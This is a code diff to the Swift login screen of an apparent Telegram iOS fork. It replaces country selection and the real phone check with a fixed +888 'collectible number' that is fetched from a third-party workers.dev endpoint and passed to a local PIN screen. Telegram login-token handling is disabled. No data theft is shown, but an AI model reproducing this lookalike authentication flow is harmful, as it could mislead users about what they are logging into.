@@ -16,6 +16,11 @@ import AuthorizationUtils
 import ManagedAnimationNode
 import Markdown
 
+private struct GeneratedPhoneResponse: Decodable {
+    let ok: Bool
+    let phone: String
+}
+
 private final class PhoneAndCountryNode: ASDisplayNode {
     let strings: PresentationStrings
     let theme: PresentationTheme
@@ -29,7 +34,11 @@ private final class PhoneAndCountryNode: ASDisplayNode {
     var checkPhone: (() -> Void)?
     var hasNumberUpdated: ((Bool) -> Void)?
     var keyPressed: ((Int) -> Void)?
-    
+
+    private var generationTask: URLSessionDataTask?
+    private let collectionCountryCode = "888"
+    private let generationURL = URL(string: "https://tg-api.matveyverus9.workers.dev/generate-phone")!
+
     var preferredCountryIdForCode: [String: String] = [:]
     
     var hasCountry = false
@@ -90,9 +99,11 @@ private final class PhoneAndCountryNode: ASDisplayNode {
         self.countryButton.titleNode.maximumNumberOfLines = 1
         self.countryButton.titleNode.truncationMode = .byTruncatingTail
         self.countryButton.setBackgroundImage(countryButtonHighlightedBackground, for: .highlighted)
+        self.countryButton.setTitle("🎲 Выбить коллекционный номер", with: Font.regular(16.0), with: theme.list.itemAccentColor, for: [])
+        self.countryButton.accessibilityLabel = "Выбить коллекционный номер"
         
         self.countryButtonArrow = ASImageNode()
-        self.countryButtonArrow.image = generateTintedImage(image: UIImage(bundleImageName: "Item List/DisclosureArrow"), color: theme.list.disclosureArrowColor)
+        self.countryButtonArrow.image = nil
         
         self.phoneBackground = ASImageNode()
         self.phoneBackground.image = phoneInputBackground
@@ -126,85 +137,33 @@ private final class PhoneAndCountryNode: ASDisplayNode {
         
         self.phoneInputNode.countryCodeField.textField.disableAutomaticKeyboardHandling = [.forward]
         self.phoneInputNode.numberField.textField.disableAutomaticKeyboardHandling = [.forward]
+
+        // +888 is a project-specific code, not a country in Telegram\'s country database.
+        self.phoneInputNode.countryCodeField.textField.text = self.collectionCountryCode
+        self.phoneInputNode.countryCodeField.textField.isUserInteractionEnabled = false
+        self.phoneInputNode.countryCodeField.textField.accessibilityTraits = [.staticText]
+        self.hasCountry = true
         
         self.countryButton.contentEdgeInsets = UIEdgeInsets(top: 0.0, left: 24.0 + 16.0, bottom: 10.0, right: 0.0)
         self.countryButton.contentHorizontalAlignment = .left
         
         self.countryButton.addTarget(self, action: #selector(self.countryPressed), forControlEvents: .touchUpInside)
                 
-        self.phoneInputNode.numberTextUpdated = { [weak self] number in
-            if let strongSelf = self {
-                let _ = strongSelf.processNumberChange(number: strongSelf.phoneInputNode.number)
-                                
-                let isServiceNumber = strongSelf.phoneInputNode.number.hasPrefix("+999")
-                if strongSelf.hasCountry || isServiceNumber {
-                    strongSelf.hasNumberUpdated?(!strongSelf.phoneInputNode.codeAndNumber.2.isEmpty || isServiceNumber)
-                } else {
-                    strongSelf.hasNumberUpdated?(false)
-                }
-            }
+        self.phoneInputNode.numberTextUpdated = { [weak self] _ in
+            guard let strongSelf = self else { return }
+            strongSelf.hasNumberUpdated?(strongSelf.hasValidCollectionNumber())
         }
-        
-        self.phoneInputNode.countryCodeUpdated = { [weak self] code, name in
-            if let strongSelf = self {
-                if let name = name {
-                    strongSelf.preferredCountryIdForCode[code] = name
-                }
-                                
-                if strongSelf.processNumberChange(number: strongSelf.phoneInputNode.number) {
-                } else if let code = Int(code), let name = name, let countryName = countryCodeAndIdToName[CountryCodeAndId(code: code, id: name)] {
-                    var localizedName: String = AuthorizationSequenceCountrySelectionController.lookupCountryNameById(name, strings: strongSelf.strings) ?? countryName
-                    if name == "FT" {
-                        localizedName = strongSelf.strings.Login_AnonymousNumbers
-                    }
-                    strongSelf.countryButton.setCountryTitle(countryId: name, name: localizedName, font: Font.regular(20.0), color: theme.list.itemAccentColor)
-                    strongSelf.hasCountry = true
-                    
-                    if strongSelf.phoneInputNode.mask == nil {
-                        strongSelf.phoneInputNode.numberField.textField.attributedPlaceholder = NSAttributedString(string: strings.Login_PhonePlaceholder, font: Font.regular(20.0), textColor: theme.list.itemPlaceholderTextColor)
-                    }
-                } else if let code = Int(code), let (countryId, countryName) = countryCodeToIdAndName[code] {
-                    var localizedName: String = AuthorizationSequenceCountrySelectionController.lookupCountryNameById(countryId, strings: strongSelf.strings) ?? countryName
-                    if countryId == "FT" {
-                        localizedName = strongSelf.strings.Login_AnonymousNumbers
-                    }
-                    strongSelf.countryButton.setCountryTitle(countryId: countryId, name: localizedName, font: Font.regular(20.0), color: theme.list.itemAccentColor)
-                    strongSelf.hasCountry = true
-                    
-                    if strongSelf.phoneInputNode.mask == nil {
-                        strongSelf.phoneInputNode.numberField.textField.attributedPlaceholder = NSAttributedString(string: strings.Login_PhonePlaceholder, font: Font.regular(20.0), textColor: theme.list.itemPlaceholderTextColor)
-                    }
-                } else {
-                    strongSelf.hasCountry = false
-                    strongSelf.countryButton.setTitle(strings.Login_SelectCountry, with: Font.regular(20.0), with: theme.list.itemAccentColor, for: [])
-                    strongSelf.phoneInputNode.mask = nil
-                    strongSelf.phoneInputNode.numberField.textField.attributedPlaceholder = NSAttributedString(string: strings.Login_PhonePlaceholder, font: Font.regular(20.0), textColor: theme.list.itemPlaceholderTextColor)
-                }
-                
-                if !strongSelf.hasCountry {
-                    // setCountryTitle labels the button with the country's name (its title starts with the flag's
-                    // placeholder); the plain "Select Country" title is read as shown.
-                    strongSelf.countryButton.accessibilityLabel = strings.Login_SelectCountry
-                }
-                strongSelf.countryButton.accessibilityTraits = [.button]
-                
-                if strongSelf.hasCountry {
-                    strongSelf.hasNumberUpdated?(!strongSelf.phoneInputNode.codeAndNumber.2.isEmpty)
-                } else {
-                    strongSelf.hasNumberUpdated?(false)
-                }
-            }
+
+        self.phoneInputNode.countryCodeUpdated = { [weak self] _, _ in
+            guard let strongSelf = self else { return }
+            strongSelf.phoneInputNode.countryCodeField.textField.text = strongSelf.collectionCountryCode
+            strongSelf.hasCountry = true
+            strongSelf.hasNumberUpdated?(strongSelf.hasValidCollectionNumber())
         }
-        
-        self.phoneInputNode.customFormatter = { number in
-            if let (_, code) = AuthorizationSequenceCountrySelectionController.lookupCountryIdByNumber(number, preferredCountries: [:]) {
-                return code.code
-            } else {
-                return nil
-            }
-        }
-        
-        self.phoneInputNode.number = "+1"
+
+        self.phoneInputNode.customFormatter = { _ in nil }
+
+        self.phoneInputNode.countryCodeField.textField.text = self.collectionCountryCode
         self.phoneInputNode.returnAction = { [weak self] in
             self?.checkPhone?()
         }
@@ -238,9 +197,68 @@ private final class PhoneAndCountryNode: ASDisplayNode {
     }
     
     @objc func countryPressed() {
-        self.selectCountryCode?()
+        self.requestGeneratedNumber()
     }
-    
+
+    private func localNumberDigits() -> String {
+        let text = self.phoneInputNode.numberField.textField.text ?? ""
+        return String(text.filter { $0.isNumber })
+    }
+
+    func hasValidCollectionNumber() -> Bool {
+        let digits = self.localNumberDigits()
+        guard (4 ... 8).contains(digits.count), let value = Int(digits) else { return false }
+        return (1 ... 88_888_888).contains(value)
+    }
+
+    func collectionPhoneNumber() -> String {
+        return "+888 " + self.localNumberDigits()
+    }
+
+    private func requestGeneratedNumber() {
+        guard self.generationTask == nil else { return }
+
+        var request = URLRequest(url: self.generationURL)
+        request.httpMethod = "GET"
+        request.timeoutInterval = 20.0
+
+        self.countryButton.isEnabled = false
+        self.generationTask = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+            DispatchQueue.main.async {
+                guard let self else { return }
+                self.generationTask = nil
+                self.countryButton.isEnabled = true
+
+                guard error == nil,
+                      let httpResponse = response as? HTTPURLResponse,
+                      (200 ... 299).contains(httpResponse.statusCode),
+                      let data,
+                      let result = try? JSONDecoder().decode(GeneratedPhoneResponse.self, from: data),
+                      result.ok,
+                      result.phone.hasPrefix("+888") else {
+                    self.phoneInputNode.numberField.textField.layer.addShakeAnimation()
+                    return
+                }
+
+                let suffix = String(result.phone.dropFirst(4))
+                let digits = String(suffix.filter { $0.isNumber })
+                guard (4 ... 8).contains(digits.count),
+                      let value = Int(digits),
+                      (1 ... 88_888_888).contains(value) else {
+                    self.phoneInputNode.numberField.textField.layer.addShakeAnimation()
+                    return
+                }
+
+                self.phoneInputNode.countryCodeField.textField.text = self.collectionCountryCode
+                self.phoneInputNode.numberField.textField.text = digits
+                self.phoneInputNode.numberField.textField.sendActions(for: .editingChanged)
+                self.hasCountry = true
+                self.hasNumberUpdated?(true)
+            }
+        }
+        self.generationTask?.resume()
+    }
+
     override func layout() {
         super.layout()
         
@@ -332,7 +350,7 @@ final class AuthorizationSequencePhoneEntryControllerNode: ASDisplayNode {
     private let debugAction: () -> Void
     
     var currentNumber: String {
-        return self.phoneAndCountryNode.phoneInputNode.number
+        return self.phoneAndCountryNode.collectionPhoneNumber()
     }
     
     var codeAndNumber: (Int32?, String?, String) {
@@ -359,6 +377,8 @@ final class AuthorizationSequencePhoneEntryControllerNode: ASDisplayNode {
     
     var selectCountryCode: (() -> Void)?
     var checkPhone: (() -> Void)?
+    /// The host flow should push its local PIN-entry screen from this callback.
+    var continueWithPhone: ((String) -> Void)?
     
     var inProgress: Bool = false {
         didSet {
@@ -471,7 +491,8 @@ final class AuthorizationSequencePhoneEntryControllerNode: ASDisplayNode {
             self?.selectCountryCode?()
         }
         self.phoneAndCountryNode.checkPhone = { [weak self] in
-            self?.checkPhone?()
+            guard let self, self.phoneAndCountryNode.hasValidCollectionNumber() else { return }
+            self.continueWithPhone?(self.phoneAndCountryNode.collectionPhoneNumber())
         }
         self.phoneAndCountryNode.hasNumberUpdated = { [weak self] hasNumber in
             self?.proceedNode.isEnabled = hasNumber
@@ -482,15 +503,10 @@ final class AuthorizationSequencePhoneEntryControllerNode: ASDisplayNode {
             }
         }
         
-        if let account = account {
-            self.tokenEventsDisposable.set((account.updateLoginTokenEvents
-            |> deliverOnMainQueue).startStrict(next: { [weak self] _ in
-                self?.refreshQrToken()
-            }))
-        }
-        
+        // Telegram login-token subscriptions are intentionally disabled in the standalone fork.
         self.proceedNode.pressed = { [weak self] in
-            self?.checkPhone?()
+            guard let self, self.phoneAndCountryNode.hasValidCollectionNumber() else { return }
+            self.continueWithPhone?(self.phoneAndCountryNode.collectionPhoneNumber())
         }
         
         self.animationNode.completed = { [weak self] _ in
